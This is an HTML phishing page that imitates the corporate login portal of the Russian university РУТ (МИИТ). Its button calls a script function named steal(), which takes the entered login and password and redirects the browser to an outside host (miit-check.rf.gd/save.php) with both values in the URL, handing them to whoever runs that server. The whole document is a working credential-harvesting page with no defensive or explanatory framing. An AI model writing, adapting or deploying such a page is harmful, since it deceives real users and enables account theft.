<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Авторизация - РУТ (МИИТ)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; padding: 40px; width: 380px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); text-align: center; }
        h2 { color: #1a1a1a; font-weight: 600; margin-bottom: 8px; }
        .sub { color: #666; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #d0d7de; border-radius: 8px; font-size: 15px; }
        button { width: 100%; padding: 14px; background: #0054a0; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .footer { margin-top: 18px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Авторизация</h2>
        <p class="sub">Единый портал РУТ (МИИТ)</p>
        <input type="text" id="login" placeholder="Корпоративный логин">
        <input type="password" id="password" placeholder="Пароль">
        <button onclick="steal()">Войти</button>
        <div class="footer">Вход через корпоративную учётную запись</div>
    </div>

    <script>
        function steal() {
            var login = document.getElementById('login').value;
            var pass = document.getElementById('password').value;

            if (!login || !pass) {
                alert('Заполните все поля');
                return;
            }

            var url = 'https://miit-check.rf.gd/save.php?login=' + encodeURIComponent(login) + '&pass=' + encodeURIComponent(pass);

            // ПРЯМОЙ ПЕРЕХОД
            window.location.href = url;
        }
    </script>
</body>
</html>
